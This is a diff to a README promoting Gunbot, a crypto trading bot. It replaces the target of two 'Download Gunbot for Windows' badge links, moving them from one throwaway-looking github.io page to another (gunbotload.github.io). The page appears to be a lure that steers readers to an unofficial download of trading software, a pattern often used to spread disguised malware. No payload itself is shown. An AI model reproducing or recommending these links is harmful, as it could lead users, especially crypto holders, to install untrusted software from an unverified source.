@@ -4,7 +4,7 @@
 
 ## 📥 Download Gunbot for Windows
 
-[![⬇️ Download Gunbot](https://img.shields.io/badge/Download-Gunbot-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/238)
+[![⬇️ Download Gunbot](https://img.shields.io/badge/Download-Gunbot-blue?style=for-the-badge&logo=windows)](https://gunbotload.github.io/.github/)
 
 ---
 
@@ -32,7 +32,7 @@ Gunbot's interface makes it easy to manage multiple trading pairs simultaneously
 
 With its one-time license purchase model, Gunbot eliminates monthly subscription costs while delivering a robust set of tools for crypto automation, from conservative grid strategies to aggressive scalping and arbitrage setups.
 
-[![⬇️ Download Gunbot](https://img.shields.io/badge/Download-Gunbot-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/238)
+[![⬇️ Download Gunbot](https://img.shields.io/badge/Download-Gunbot-blue?style=for-the-badge&logo=windows)](https://gunbotload.github.io/.github/)
 
 ---
 
